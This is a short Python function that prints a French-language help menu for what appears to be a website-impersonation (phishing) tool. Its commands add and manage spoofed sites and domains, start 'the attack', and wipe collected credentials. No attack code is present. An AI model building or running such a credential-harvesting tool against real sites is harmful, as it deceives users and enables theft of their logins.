from tabulate import tabulate

def help_command(params):

    data = [
        ["help", "Affiche les commandes disponibles"],
        ["status", "Affiche le status de la configuration"],
        ["list", "Affiche la liste des sites usurpés"],
        ["add_site domain1 [other_domains] archive https", "Ajouter un site internet à usurper"],
        ["rem_site site_id", "Supprimer un site internet à usurper"],
        ["dis_site site_id", "Désactiver temporairement un site"],
        ["ena_site site_id", "Réactiver un site"],
        ["clear_all", "Supprime tous les fichiers historique et identifiants (! ATTENTION !)"],
        ["add_domain_to_site domain1 [other domains] site_id", "Ajouter un domaine à un site à usurper"],
        ["rem_domain_to_site domain1 [other_domains] site_id", "Supprimer un domaine à un site à usurper"],
        ["start", "Démarrer l'attaque"],
        ["exit", "Terminer l'attaque et le programme. Nettoie les fichiers"]
    ]

    headers = ["Commande", "Usage"]

    print(tabulate(data, headers, tablefmt="grid"))